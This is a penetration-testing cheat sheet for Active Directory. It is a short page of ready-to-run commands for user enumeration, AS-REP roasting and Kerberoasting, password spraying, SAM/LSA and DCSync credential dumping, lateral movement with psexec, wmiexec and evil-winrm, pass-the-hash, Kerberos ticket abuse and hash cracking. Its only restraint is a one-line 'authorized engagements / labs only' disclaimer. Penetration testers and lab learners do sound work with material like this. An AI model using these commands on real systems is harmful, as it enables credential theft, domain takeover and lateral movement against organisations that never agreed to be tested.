# Active Directory — quick reference

> Authorized engagements / labs only. Helpers live in `shell/ad.sh` (`adset` to see env).

Set once:
```bash
export DOMAIN=corp.local DC=10.10.11.10 U=svc-web P='Passw0rd!'
```

## Enumeration (unauth → auth)
```bash
nxc-null 10.10.11.10                 # null/guest SMB shares
nxc smb $DC -u '' -p '' --users      # sometimes users leak on null
nxc-users $DC                        # RID brute
kerbrute-users $DC users.txt $DOMAIN # validate users pre-auth
nxc ldap $DC -u $U -p $P --bloodhound --collection All   # if supported
bhpy                                 # bloodhound-python collector -> zip
```

## Cred attacks
```bash
asrep $DC $DOMAIN users.txt          # AS-REP roast (no pre-auth)  -> hashcat -m 18200
kerberoast                           # SPN roast (needs creds)     -> hashcat -m 13100
nxc-spray $DC users.txt 'Spring2026!'  # one password, mind lockout
```

## Post-cred
```bash
nxc smb $DC -u $U -p $P --shares --sam --lsa
secretsdump 10.10.11.10              # DCSync if $U has the rights
nxc smb targets.txt -u $U -p $P -x whoami   # spray exec across hosts
```

## Movement
```bash
impacket-psexec  $DOMAIN/$U:$P@$RHOST
impacket-wmiexec $DOMAIN/$U:$P@$RHOST        # quieter than psexec
evil-winrm -i $RHOST -u $U -p $P             # if WinRM (5985) open
# pass-the-hash: swap -p $P for -H <nthash> on most impacket/nxc/evil-winrm
```

## Tickets (once you have a shell / hash)
```bash
export KRB5CCNAME=ticket.ccache
impacket-getTGT $DOMAIN/$U:$P -dc-ip $DC
impacket-getST -spn cifs/target $DOMAIN/$U -hashes :<nthash>   # S4U / delegation
```

Crack anything: `crack asrep.hash asrep` / `crack kerb.hash kerb` / `crack ntds.hash ntlm`
